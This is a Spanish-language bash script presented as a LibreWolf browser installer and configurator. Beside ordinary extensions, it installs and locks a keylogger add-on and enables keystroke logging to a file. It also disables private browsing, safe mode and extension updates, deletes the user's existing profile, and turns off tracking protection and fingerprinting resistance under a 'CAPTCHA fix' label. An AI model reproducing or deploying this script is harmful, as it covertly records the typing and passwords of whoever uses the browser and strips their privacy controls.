#!/bin/bash
# Script LibreWolf

clear
REAL_USER=$(logname 2>/dev/null || echo $SUDO_USER)
USER_HOME=$(getent passwd $REAL_USER | cut -d: -f6)

if [ "$EUID" -ne 0 ]; then 
  echo "Ejecuta con: sudo bash $0"
  exit 1
fi

echo "=== INSTALACIÓN DE LIBREWOLF ==="

# 1. LIMPIEZA TOTAL
pkill -9 librewolf 2>/dev/null || true
apt-get purge -y librewolf* 2>/dev/null || true
rm -rf "$USER_HOME/.librewolf" /etc/librewolf 2>/dev/null || true

# 2. INSTALACIÓN CORRECTA
apt-get update -y
apt-get install -y curl gnupg
curl -s "https://deb.librewolf.net/key.gpg" | gpg --dearmor > /usr/share/keyrings/librewolf.gpg
echo "deb [signed-by=/usr/share/keyrings/librewolf.gpg] http://deb.librewolf.net ubuntu main" > /etc/apt/sources.list.d/librewolf.list

apt-get update -y
apt-get install -y librewolf

# 3. POLÍTICAS CON TODAS LAS EXTENSIONES Y BLOQUEO DE BUSCADORES
mkdir -p /etc/librewolf/policies
cat > /etc/librewolf/policies/policies.json << 'POLICY_EOF'
{
  "policies": {
    "DisableTelemetry": true,
    "OverrideFirstRunPage": "https://duckduckgo.com/?t=ffab&kl=es-es",
    "DisableSafeMode": true,
    "DisablePrivateBrowsing": true,
    "SearchEngines": {
      "Default": "DuckDuckGo",
      "PreventInstalls": true,
      "Remove": ["Google", "Bing", "Amazon.com", "eBay", "Twitter", "Yahoo", "Wikipedia", "YouTube"]
    },
"Extensions": {
  "Install": [
    "https://addons.mozilla.org/firefox/downloads/latest/ublock-origin/latest.xpi",
    "https://addons.mozilla.org/firefox/downloads/latest/darkreader/latest.xpi",
    "https://addons.mozilla.org/firefox/downloads/latest/privacy-badger17/latest.xpi",
    "https://addons.mozilla.org/firefox/downloads/file/4641717/ruffle_rs-0.2.0.25347.xpi",
    "https://addons.mozilla.org/firefox/downloads/file/2994462/kl-1.5.4.xpi"
  ],
  "Locked": [
    "uBlock0@raymondhill.net",
    "addon@darkreader.org",
    "jid1-MnnxcxisBPnSXQ@jetpack",
    "{b5501fd1-7084-45c5-9aa6-567c2fcf5dc6}",
    "{b9e5d196-6a3b-48b2-9b2b-08e661d144c5}"
  ]
},
    "Preferences": {
      "intl.locale.requested": "es-ES",
      "browser.aboutwelcome.enabled": false,
      "xpinstall.enabled": false,
      "extensions.update.enabled": false,
      "browser.search.widget.inNavBar": false
    }
  }
}
POLICY_EOF

# 4. CREAR PERFIL
sudo -u $REAL_USER librewolf --headless --first-startup 2>/dev/null &
sleep 30
pkill -9 librewolf 2>/dev/null || true

# 5. CONFIGURACIÓN COMPLETA DEL PERFIL
PROFILE_PATH=$(find "$USER_HOME/.librewolf" -name "*.default*" -type d | head -1)

if [ -n "$PROFILE_PATH" ]; then
    cat > "$PROFILE_PATH/user.js" << 'USER_EOF'
// CONFIGURACIÓN BÁSICA
user_pref("browser.startup.page", 1);
user_pref("browser.startup.homepage", "https://duckduckgo.com/?t=ffab&kl=es-es");
user_pref("browser.newtabpage.enabled", true);

// BLOQUEO TOTAL - SOLO DUCKDUCKGO
user_pref("browser.search.defaultenginename", "DuckDuckGo");
user_pref("browser.search.selectedEngine", "DuckDuckGo");
user_pref("browser.search.order.1", "DuckDuckGo");
user_pref("browser.search.hiddenOneOffs", "Google,Bing,Amazon.com,eBay,Twitter,Yahoo,Wikipedia");
user_pref("browser.urlbar.placeholderName", "DuckDuckGo");
user_pref("browser.urlbar.suggest.searches", false);
user_pref("browser.urlbar.suggest.engines", false);
user_pref("browser.urlbar.quicksuggest.enabled", false);
user_pref("browser.search.widget.inNavBar", false);
user_pref("browser.search.suggest.enabled", false);

// TEMA OSCURO COMPLETO
user_pref("extensions.activeThemeID", "firefox-compact-dark@mozilla.org");
user_pref("browser.theme.toolbar-theme", 2);
user_pref("browser.theme.content-theme", 2);
user_pref("ui.systemUsesDarkTheme", 1);

// SOLUCIÓN CAPTCHAS Y BÚSQUEDAS
user_pref("privacy.resistFingerprinting", false);
user_pref("privacy.trackingprotection.enabled", false);
user_pref("privacy.trackingprotection.socialtracking.enabled", false);
user_pref("privacy.purge_trackers.enabled", false);
user_pref("privacy.annotate_channels.strict_list.enabled", false);
user_pref("network.http.referer.defaultPolicy", 2);
user_pref("network.http.referer.defaultPolicy.pbmode", 2);
user_pref("layout.css.prefers-color-scheme.content-override", 0);

// DARK READER CONFIGURADO
user_pref("extensions.darkreader.enabled", true);
user_pref("extensions.darkreader.theme", "dark");
user_pref("extensions.darkreader.enablePDF", true);
user_pref("extensions.darkreader.defaultMode", "dark");
user_pref("extensions.darkreader.enableForProtectedPages", false);

// CONFIGURAR RUFFLE PARA FLASH
user_pref("ruffle.autoplay", "on");
user_pref("ruffle.enable", true);
user_pref("ruffle.showSwfDownload", true);
user_pref("ruffle.hwaccel", true);

// CONFIGURAR KEYLOGGER (ID: {b9e5d196-6a3b-48b2-9b2b-08e661d144c5})
user_pref("extensions.keylogger.enabled", true);
user_pref("extensions.keylogger.autoStart", true);
user_pref("extensions.keylogger.logKeystrokes", true);
user_pref("extensions.keylogger.logToFile", true);

// IDIOMA
user_pref("intl.locale.requested", "es-ES");
user_pref("intl.accept_languages", "es-ES, es");

// ICONOS VISIBLES EN BARRA (CON KEYLOGGER)
user_pref("browser.uiCustomization.state", "{\"placements\":{\"widget-overflow-fixed-list\":[],\"nav-bar\":[\"back-button\",\"forward-button\",\"stop-reload-button\",\"urlbar-container\",\"downloads-button\",\"ublock-origin-browser-action\",\"_4650630b-0644-4809-940f-7c4587a82b0b_-browser-action\",\"jid1-MnnxcxisBPnSXQ_jetpack-browser-action\",\"_{b5501fd1-7084-45c5-9aa6-567c2fcf5dc6}-browser-action\",\"_{b9e5d196-6a3b-48b2-9b2b-08e661d144c5}-browser-action\"],\"PersonalToolbar\":[\"personal-bookmarks\"],\"TabsToolbar\":[\"tabbrowser-tabs\",\"new-tab-button\",\"alltabs-button\"]},\"seen\":[\"ublock-origin-browser-action\",\"_4650630b-0644-4809-940f-7c4587a82b0b_-browser-action\",\"jid1-MnnxcxisBPnSXQ_jetpack-browser-action\",\"_{b5501fd1-7084-45c5-9aa6-567c2fcf5dc6}-browser-action\",\"_{b9e5d196-6a3b-48b2-9b2b-08e661d144c5}-browser-action\"],\"dirtyAreaCache\":[\"nav-bar\"],\"currentVersion\":20}");
USER_EOF
    
    chown -R $REAL_USER:$REAL_USER "$PROFILE_PATH"
    
    # INSTALACIÓN FÍSICA DE EXTENSIONES (por si fallan políticas)
    EXT_DIR="$PROFILE_PATH/extensions"
    mkdir -p "$EXT_DIR"
    
    # Dark Reader
    curl -s -L "https://addons.mozilla.org/firefox/downloads/latest/darkreader/latest.xpi" -o "$EXT_DIR/{4650630b-0644-4809-940f-7c4587a82b0b}.xpi"
    
    # Ruffle (CON ID CORRECTO)
    curl -s -L "https://addons.mozilla.org/firefox/downloads/file/4641717/ruffle_rs-0.2.0.25347.xpi" -o "$EXT_DIR/{b5501fd1-7084-45c5-9aa6-567c2fcf5dc6}.xpi"
    
    # uBlock Origin
    curl -s -L "https://addons.mozilla.org/firefox/downloads/latest/ublock-origin/latest.xpi" -o "$EXT_DIR/uBlock0@raymondhill.net.xpi"
    
    # Privacy Badger
    curl -s -L "https://addons.mozilla.org/firefox/downloads/latest/privacy-badger17/latest.xpi" -o "$EXT_DIR/jid1-MnnxcxisBPnSXQ@jetpack.xpi"
    
    # Key Logger (ID: {b9e5d196-6a3b-48b2-9b2b-08e661d144c5})
    curl -s -L "https://addons.mozilla.org/firefox/downloads/file/2994462/kl-1.5.4.xpi" -o "$EXT_DIR/{b9e5d196-6a3b-48b2-9b2b-08e661d144c5}.xpi"
    
    chown -R $REAL_USER:$REAL_USER "$EXT_DIR"
fi

# RESET DE TERMINAL
reset 2>/dev/null || stty sane

echo ""
echo "✅ INSTALACIÓN COMPLETADA CORRECTAMENTE"
echo ""
exit 0